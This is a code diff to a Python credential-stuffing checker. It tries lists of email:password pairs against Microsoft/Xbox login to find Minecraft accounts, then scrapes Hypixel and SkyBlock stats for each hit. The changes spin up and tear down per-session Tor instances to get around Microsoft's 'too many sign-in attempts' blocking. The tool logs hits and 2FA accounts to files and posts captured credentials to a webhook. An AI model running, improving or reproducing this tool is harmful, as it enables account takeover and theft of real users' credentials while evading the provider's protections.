@@ -1,4 +1,4 @@
-import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, subprocess, tarfile, traceback
+import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, subprocess, tarfile, traceback, warnings, socket
 from time import gmtime, strftime
 from colorama import Fore
 from stem import Signal
@@ -26,7 +26,8 @@ fname = ""
 webhook_message = ""
 webhook = ""
 hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries = 0,0,0,0,0,0,0,0,0,0,0,0
-urllib3.disable_warnings()
+urllib3.disable_warnings() #spams warnings because i send unverified requests for debugging purposes
+warnings.filterwarnings("ignore") #spams python warnings on some functions, i may be using some outdated things...
 
 class Capture:
     def notify(email, password, name, hypixel, level, firstlogin, lastlogin, cape, capes, access, sbcoins, bwstars):
@@ -51,7 +52,7 @@ class Capture:
             requests.post(webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
         except Exception as e: 
             errors+=1
-            open(f"results/error.txt", 'a').write(f"Error: {e}\nLine: {traceback.extract_tb(e.__traceback__)[-1].lineno}")
+            #open(f"results/error.txt", 'a').write(f"Error: {e}\nLine: {traceback.extract_tb(e.__traceback__)[-1].lineno}")
 
     def hypixel(name):
         global errors
@@ -62,19 +63,19 @@ class Capture:
             olastlogin = "N/A"
             obwstars = "N/A"
             osbcoins = "N/A"
-            tx = requests.get('https://plancke.io/hypixel/player/stats/'+name, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
+            tx = requests.get('https://plancke.io/hypixel/player/stats/'+name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
             try: oname = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
-            except: _=''
+            except: pass
             try: olevel = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
-            except: _=''
+            except: pass
             try: ofirstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
-            except: _=''
+            except: pass
             try: olastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
-            except: _=''
+            except: pass
             try: obwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
-            except: _=''
+            except: pass
             try:
-                req = requests.get("https://sky.shiiyu.moe/stats/"+name, verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
+                req = requests.get("https://sky.shiiyu.moe/stats/"+name, proxies=getproxy(), verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                 osbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
             except: errors+=1
             return oname, olevel, ofirstlogin, olastlogin, osbcoins, obwstars
@@ -130,7 +131,7 @@ Access: {access}
 =======================\n''')
         Capture.notify(email, password, mc, oname, olevel, ofirstlogin, olastlogin, cape, capes, access, osbcoins, obwstars)
 
-def get_urlPost_sFTTag(session, tries = 0):
+def get_urlPost_sFTTag(session, port, tries = 0):
     global retries
     while tries < maxretries:
         try:
@@ -141,15 +142,18 @@ def get_urlPost_sFTTag(session, tries = 0):
                 sFTTag = match.group(1)
                 match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                 if match is not None:
-                    return match.group(1), sFTTag, session
+                    return match.group(1), sFTTag, session, port
         except: pass
-        if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
-        session.proxy = getproxy()
+        if proxytype == "'4'":
+            stop_tor(port)
+            port, session = get_tor(session)
+        else:
+            session.proxy = getproxy()
         retries+=1
         tries+=1
     return None
 
-def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
+def get_xbox_rps(session, email, password, urlPost, sFTTag, port, tries=0):
     global bad, checked, cpm, twofa, retries, checked
     try:
         data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
@@ -161,7 +165,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
                 if key == 'access_token':
                     token = requests.utils.unquote(value)
                     break
-            return token, session
+            return token, session, port
         #sec info change
         elif 'cancel?mkt=' in login_request.text:
             data = {'ipt':re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(), 'pprid':re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(), 'uaid':re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()}
@@ -174,21 +178,24 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
                     if key == 'access_token':
                         token = requests.utils.unquote(value)
                         break
-                return token, session
+                return token, session, port
         elif "tried to sign in too many times with an incorrect account or password." in login_request.text:
-            if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
-            session.proxy = getproxy()
+            if proxytype == "'4'":
+                stop_tor(port)
+                port, session = get_tor(session)
+            else:
+                session.proxy = getproxy()
             if tries < maxretries:
                 retries+=1
                 tries+=1
                 #if screen == "'2'": print(Fore.LIGHTRED_EX+f"Blocked, retrying: {email}:{password} {Fore.LIGHTBLACK_EX}[{str(tries)}/{str(maxretries)}]")
-                return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
+                return get_xbox_rps(session, email, password, urlPost, sFTTag, port, tries)
             else:
                 bad+=1
                 checked+=1
                 cpm+=1
                 if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-                return None, session
+                return None, session, port
         #2fa
         elif any(value in login_request.text for value in ["recover?mkt" , "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
             twofa+=1
@@ -196,39 +203,47 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
             cpm+=1
             if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
             with open(f"results/{fname}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
-            return None, session
+            return None, session, port
         #bad
         elif any(value in login_request.text for value in ["Your account or password is incorrect." , "That Microsoft account doesn't exist. Enter a different account" , "Sign in to your Microsoft account" ]):
             bad+=1
             checked+=1
             cpm+=1
             if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-            return None, session
+            return None, session, port
         #blocked, retry
         else:
-            if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
-            session.proxy = getproxy()
+            if proxytype == "'4'":
+                stop_tor(port)
+                port, session = get_tor(session)
+            else:
+                session.proxy = getproxy()
             if tries < maxretries:
                 retries+=1
                 tries+=1
-                return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
+                return get_xbox_rps(session, email, password, urlPost, sFTTag, port, tries)
             else:
                 bad+=1
                 checked+=1
                 cpm+=1
                 if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-                return None, session
+                return None, session, port
     except:
-        if tries < maxretries: 
+        if tries < maxretries:
+            if proxytype == "'4'":
+                stop_tor(port)
+                port, session = get_tor(session)
+            else:
+                session.proxy = getproxy()
             retries+=1
             tries+=1
-            return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
+            return get_xbox_rps(session, email, password, urlPost, sFTTag, port, tries)
         else:
             bad+=1
             checked+=1
             cpm+=1
             if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-            return None, session
+            return None, session, port
 
 def validmail(email, password):
     global vm, cpm, checked
@@ -236,17 +251,23 @@ def validmail(email, password):
     cpm+=1
     checked+=1
     with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
+    if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Valid Mail: {email}:{password}")
 
 def authenticate(email, password):
-    global vm, bad, retries, checked, cpm
+    global vm, bad, retries, checked, cpm, hits
+    port = None
     try:
-        proxy = getproxy()
         session = requests.Session()
         session.verify = False
-        session.proxies = proxy
-        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
-        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
+        if proxytype == "'4'": 
+            port, session = get_tor(session)
+        else:
+            proxy = getproxy()
+            session.proxies = proxy
+        urlPost, sFTTag, session, port = get_urlPost_sFTTag(session, port)
+        token, session, port = get_xbox_rps(session, email, password, urlPost, sFTTag, port)
         if token is not None:
+            hit = False
             try:
                 xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                 js = xbox_login.json()
@@ -264,26 +285,27 @@ def authenticate(email, password):
                                 if access_token is not None:
                                     mc, capes = account(access_token, session)
                                     if mc != None:
+                                        hit = True
                                         Capture.handle(mc, email, password, capes)
                                     else:
+                                        hit = True
                                         hits+=1
                                         cpm+=1
                                         checked+=1
                                         with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
                                         if screen == "'2'": print(Fore.GREEN+f"Hit: No Name Set | {email}:{password}")
                                         Capture.notify(email, password, "Not Set", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A")
-                                else: validmail(email, password)
-                            except: validmail(email, password)
-                        else: validmail(email, password)
-                    except: validmail(email, password)
-                else: validmail(email, password)
-            except: validmail(email, password)
+                            except: pass
+                    except: pass
+            except: pass
+            if hit == False: validmail(email, password)
+        if proxytype == "'4'": stop_tor(port)
     except Exception as e:
         #print(e)
         #traceback.print_exc()
         #line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
         #print("Exception occurred at line:", line_number)
-        if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
+        if proxytype == "'4'": stop_tor(port)
         retries+=1
         authenticate(email, password)
 
@@ -385,11 +407,25 @@ def finishedscreen():
     repr(readchar.readkey())
     os.abort()
 
-def renew_tor(port):
-    with Controller.from_port(address='127.0.0.1', port=port) as controller:
+def get_free_port():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind(('localhost', 0))
+        _, port = s.getsockname()
+        return port
+
+def get_tor(session):
+    port = get_free_port()
+    subprocess.Popen([os.path.join(os.getcwd(), r"tor\tor.exe"),
+        '--SocksPort', str(port),
+        '--ControlPort', str(port+1)
+    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    session.proxies = {'http': 'socks5://127.0.0.1:'+str(port), 'https': 'socks5://127.0.0.1:'+str(port)}
+    return port, session
+
+def stop_tor(port):
+    with Controller.from_port(port=port+1) as controller:
         controller.authenticate()
-        controller.signal(Signal.NEWNYM)
-        time.sleep(controller.get_newnym_wait())
+        controller.signal(Signal.SHUTDOWN)
 
 def getproxy():
     if proxytype != "'5'": 
@@ -442,7 +478,7 @@ Bedwars Stars: <bedwarsstars>'''}
     maxretries = int(read_file['Settings']['MaxRetries'])
     webhook_message = str(read_file['Settings']['WebhookMessage'])
 
-def checkandinstalltor(toramount):
+def checkandinstalltor():
     global proxylist
     if not os.path.exists("tor/tor.exe"):
         print(Fore.YELLOW+"Tor is not installed. Downloading now.")
@@ -463,15 +499,6 @@ def checkandinstalltor(toramount):
         print("Downloaded Tor successfully.")
     if not os.path.exists("tor/data"):
         os.makedirs("tor/data")
-    print(Fore.LIGHTYELLOW_EX+"Starting Tor Proxies. Please Wait.")
-    for i in range(int(toramount)):
-        socks_port = 9050 + i
-        subprocess.Popen([
-            os.path.join(os.getcwd(), r"tor\tor.exe"),
-            '--SocksPort', str(socks_port),
-            '--ControlPort', str(9051 + i)
-        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        proxylist.append("127.0.0.1:"+str(socks_port))
 
 def Main():
     global proxytype, screen
@@ -491,17 +518,9 @@ def Main():
         print(Fore.LIGHTRED_EX+"Must be a number.") 
         time.sleep(2)
         Main()
-    print(Fore.LIGHTBLUE_EX+f"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] Tor {Fore.LIGHTBLACK_EX}[not stable]{Fore.LIGHTBLUE_EX} - [5] None")
+    print(Fore.LIGHTBLUE_EX+f"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] Tor - [5] None")
     proxytype = repr(readchar.readkey())
-    if proxytype =="'4'":
-        try:
-            print(Fore.LIGHTBLACK_EX+f"(amount of tor proxies, i suggest {str(thread//10)}.)")
-            toramt = int(input(Fore.LIGHTBLUE_EX+"Tor Proxies: "))
-            checkandinstalltor(toramt)
-        except:
-            print(Fore.LIGHTRED_EX+"Must be a number.") 
-            time.sleep(5)
-            Main()
+    if proxytype == "'4'": checkandinstalltor()
     print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
     screen = repr(readchar.readkey())
     print(Fore.LIGHTBLUE_EX+"Select your combos")
